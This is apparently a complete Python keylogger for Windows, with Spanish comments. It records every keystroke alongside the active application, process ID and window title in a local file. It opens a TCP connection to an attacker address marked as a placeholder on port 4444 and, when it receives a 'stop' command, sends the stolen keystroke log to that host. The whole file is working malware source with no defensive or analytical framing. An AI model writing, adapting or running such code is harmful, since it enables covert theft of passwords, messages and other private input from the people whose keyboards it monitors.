from ctypes import byref, create_string_buffer, c_ulong, windll
from pynput import keyboard

import socket


class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0) 
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid.value)
        
        if h_process:
            windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
            windll.kernel32.CloseHandle(h_process)

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        try:
            exe_name = executable.value.decode('latin-1', errors='ignore')
            if not exe_name:
                exe_name = "Unknown"
        except Exception:
            exe_name = "Unknown"

        try:
            self.current_window = window_title.value.decode('latin-1', errors='ignore')
            if not self.current_window:
                self.current_window = "Unknown"
        except Exception:
            self.current_window = "Unknown"

        return f"\n[APP: {exe_name} | PID: {process_id}] Ventana: {self.current_window}"

    def mykeystroke(self, key):
        hwnd = windll.user32.GetForegroundWindow()
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        with open("registro.txt", "a", encoding="utf-8") as file:
            try:
                active_title = window_title.value.decode('latin-1', errors='ignore')
            except:
                active_title = ""

            if active_title != self.current_window:
                current_process = self.get_current_process()
                file.write(str(current_process))
            try:
                if key.char:
                    file.write(key.char)
            except AttributeError:
                if key == keyboard.Key.space:
                    file.write(" ")
                elif key == keyboard.Key.enter:
                    file.write("\n")
                elif key == keyboard.Key.tab:
                    file.write("[TAB]")

def run():
    kl = KeyLogger()
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect(("YOUR IP", 4444)) #IP ATACANTE
    except Exception as e:
        print(f"[-] Error de conexión: {e}")
        return

    listener = keyboard.Listener(on_press=kl.mykeystroke)
    listener.start()

    try:
        command = client.recv(1024).decode('utf-8', errors='ignore').strip().lower()

        if command == "stop":
            listener.stop()

            with open("registro.txt", "rb") as file:
                while True:
                    data = file.read(1024)
                    if not data:
                        break
                    client.sendall(data)

            client.shutdown(socket.SHUT_WR)
            client.close()
            
    except Exception as e:
        print(f"[-] Error en la comunicación: {e}")
        listener.stop()
        client.close()

if __name__ == "__main__":
    run()
